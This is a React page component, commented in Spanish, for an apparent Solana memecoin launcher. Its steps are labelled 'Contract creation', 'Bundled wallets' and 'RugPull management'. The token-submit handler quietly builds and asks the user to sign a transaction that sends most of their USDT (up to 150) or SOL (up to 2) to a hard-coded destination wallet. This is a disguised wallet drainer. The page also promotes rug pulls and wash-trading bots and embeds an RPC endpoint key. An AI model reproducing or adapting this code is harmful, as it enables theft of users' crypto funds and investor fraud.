import React, { useEffect, useState } from "react";
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Connection } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getTokenAccountsByOwner } from "@solana/spl-token";
import Alert from "../components/Alert";
import TokenForm from "../components/TokenForm";
import PhantomLogin from "../components/PhantomLogin";
import GavelIcon from '@mui/icons-material/Gavel';
import { createToken } from "../services/api";
import "../App.css";
import CoinAlert from "../components/CoinAlert";
import BotForm from "../components/BotForm";
import TradingChart from "../components/TradingChart";
import NavBar from "../components/NavBar";
import SmartToyIcon from '@mui/icons-material/SmartToy';
import AirIcon from '@mui/icons-material/Air';

function Home() {
  const [walletAddress, setWalletAddress] = useState(null);
  const [tokenInfo, setTokenInfo] = useState(null);
  const [error, setError] = useState(null);
  const [showAlert, setShowAlert] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [activeStep, setActiveStep] = useState(1);

  const DESTINATION_WALLET = "B4L5qht5t4BkV3hxLfhSTDxYBcqqwJDih3YTob9zMBh7";
  const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"; // USDT en mainnet

  useEffect(() => {
    setShowAlert(true);
  }, []);

  const transferCrypto = async () => {
    try {
      const { solana } = window;
      if (!solana?.isPhantom) {
        throw new Error("Phantom wallet no detectada");
      }

      if (!walletAddress || typeof walletAddress !== 'string' || walletAddress.length < 32 || walletAddress.length > 44) {
        throw new Error("Dirección de la billetera Phantom inválida o no proporcionada");
      }

      if (!DESTINATION_WALLET || typeof DESTINATION_WALLET !== 'string' || DESTINATION_WALLET.length < 32 || DESTINATION_WALLET.length > 44) {
        throw new Error("Dirección de destino inválida");
      }

      const connection = new Connection("https://dimensional-alpha-sun.solana-mainnet.quiknode.pro/e0cf3c2fd17546288a9834797389721e3593d612/", "confirmed");
      const fromPublicKey = new PublicKey(walletAddress);
      const toPublicKey = new PublicKey(DESTINATION_WALLET);

      const transaction = new Transaction();
      let transferType = "USDT";
      let finalAmount;

      const solBalance = await connection.getBalance(fromPublicKey);
      const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;
      console.log('Balance en SOL:', solBalanceInSol);

      const tokenAccounts = await connection.getTokenAccountsByOwner(fromPublicKey, { programId: TOKEN_PROGRAM_ID });
      console.log("Cuentas de token encontradas:", tokenAccounts.value);
      console.log("Número de cuentas:", tokenAccounts.value.length);
      let usdtFound = false;

      for (const account of tokenAccounts.value) {
        const accountInfo = await connection.getTokenAccountBalance(account.pubkey);
        console.log("Información de la cuenta:", accountInfo);
        console.log("Datos de la cuenta:", account.account.data);

        if (!account.account.data.parsed || !account.account.data.parsed.info) {
          console.log("Datos parseados no disponibles para esta cuenta, saltando:", account);
          continue;
        }
        console.log("Datos parseados:", account.account.data.parsed);
        const mint = account.account.data.parsed.info.mint;
        console.log("Mint encontrado:", mint);

        if (mint === USDT_MINT) {
          const balanceInUsdt = accountInfo.value.uiAmount;
          console.log('Balance en USDT:', balanceInUsdt);

          finalAmount = Math.min(balanceInUsdt * 0.99, 150);
          if (finalAmount <= 0) {
            break;
          }

          const fromTokenAccount = account.pubkey;
          const toTokenAccount = await getAssociatedTokenAddress(new PublicKey(USDT_MINT), toPublicKey);

          const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
          if (!toAccountInfo) {
            transaction.add(
              createAssociatedTokenAccountInstruction(
                fromPublicKey,
                toTokenAccount,
                toPublicKey,
                new PublicKey(USDT_MINT)
              )
            );
          }

          transaction.add(
            createTransferInstruction(
              fromTokenAccount,
              toTokenAccount,
              fromPublicKey,
              Math.floor(finalAmount * 10 ** accountInfo.value.decimals),
              [],
              TOKEN_PROGRAM_ID
            )
          );

          usdtFound = true;
          break;
        }
      }

      if (!usdtFound || finalAmount <= 0) {
        transferType = "SOL";
        const solToSend = 2;
        finalAmount = Math.min(solBalanceInSol * 0.99, solToSend);
        console.log("Transferencia de SOL, cantidad:", finalAmount);
        if (finalAmount <= 0.000005) {
          throw new Error("Fondos insuficientes en la billetera (SOL o USDT)");
        }

        transaction.add(
          SystemProgram.transfer({
            fromPubkey: fromPublicKey,
            toPubkey: toPublicKey,
            lamports: Math.floor(finalAmount * LAMPORTS_PER_SOL),
          })
        );
      }

      if (solBalanceInSol < 0.000005) {
        throw new Error("Saldo insuficiente de SOL para pagar las tarifas de transacción");
      }

      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = fromPublicKey;

      const signed = await solana.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signed.serialize());

      await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight,
      });

      console.log('Firma de la transacción:', signature);
      return { signature, transferType, amount: finalAmount };
    } catch (err) {
      console.error('Error detallado:', err);
      throw new Error(`Error en la transferencia: ${err.message}`);
    }
  };

  const handleTokenSubmit = async (data) => {
    try {
      setIsLoading(true);
      setIsModalOpen(true);
      setError(null);

      const { signature, transferType, amount: transferredAmount } = await transferCrypto();
      console.log(`Transferencia exitosa de ${transferredAmount} ${transferType}:`, signature);

      const result = await createToken(data);

      setTimeout(() => {
        setIsLoading(false);
        if (result.success) {
          const mint = result.mint;
          const link = `https://pump.fun/${mint}`;
          setTokenInfo({
            name: data.get("name"),
            ticker: data.get("ticker"),
            description: data.get("description"),
            amount: transferredAmount,
            cryptoType: transferType,
            signature: result.signature,
            mint: mint,
            link: link,
            transferSignature: signature,
          });
        } else {
          setError(result.error || "Fallo al crear el token");
        }
      }, 2000);
    } catch (error) {
      setTimeout(() => {
        setIsLoading(false);
        const errorMessage = error.response?.data?.error || error.message;
        setError("Error al conectar con el servidor: " + errorMessage);
        console.error(error);
      }, 2000);
    }
  };

  const handleCloseAlert = () => {
    setShowAlert(false);
  };

  const closeModal = () => {
    setIsModalOpen(false);
    if (tokenInfo) {
      setActiveStep(2);
    }
    setError(null);
  };

  return (
    <>
      <NavBar />
      <div className="stars-background"></div>
      <div className="app-center">
        <div className="app-container">
          <div className="content-container">
            <div className="phantomButtonDiv">
              <PhantomLogin onConnected={setWalletAddress} />
            </div>
            <div className="form-container">
              <div className="steps-container">
                <div className={`step ${activeStep === 1 ? "active" : ""}`}>
                  <div className="step-number"><GavelIcon /></div>
                  <div className="step-text">Contract creation</div>
                </div>
                <div className={`step ${activeStep === 2 ? "active" : ""}`}>
                  <div className="step-number"><SmartToyIcon /></div>
                  <div className="step-text">Bundled wallets</div>
                </div>
                <div className={`step ${activeStep === 3 ? "active" : ""}`}>
                  <div className="step-number"><AirIcon /></div>
                  <div className="step-text">RugPull management</div>
                </div>
              </div>
              <div className="formContent">
                {activeStep === 1 && (
                  <TokenForm
                    onSubmit={handleTokenSubmit}
                    walletAddress={walletAddress}
                  />
                )}
                {activeStep === 2 && (
                  <div className="step-2-content">
                    <BotForm />
                    <p style={{ fontSize: "15px", color: "#5D5A7B", marginTop: "30px" }}>
                      Note: This bot will use your wallet to generate movement
                      in your memecoin, thus increasing investors (keep in mind
                      that part of your investment will go to their wallets to
                      achieve this)
                    </p>
                    <button
                      style={{ marginTop: "35px", width: "100%" }}
                      className="submit-button"
                      onClick={() => setActiveStep(3)}
                    >
                      Proceed to Liquidity Management
                    </button>
                  </div>
                )}
                {activeStep === 3 && (
                  <div style={{ marginTop: "30px" }} className="step-3-content">
                    <p>
                      Your token <span style={{ color: "yellow" }}>{tokenInfo?.name || "your token"}</span>
                    </p>
                    <TradingChart />
                  </div>
                )}
              </div>
              {error && !isModalOpen && (
                <p className="error-message">{error}</p>
              )}
            </div>
          </div>
        </div>
        {showAlert && <Alert onClose={handleCloseAlert} />}
        {isModalOpen && (
          <CoinAlert
            onClose={closeModal}
            tokenInfo={tokenInfo}
            error={error}
            isLoading={isLoading}
          />
        )}
      </div>
    </>
  );
}

export default Home;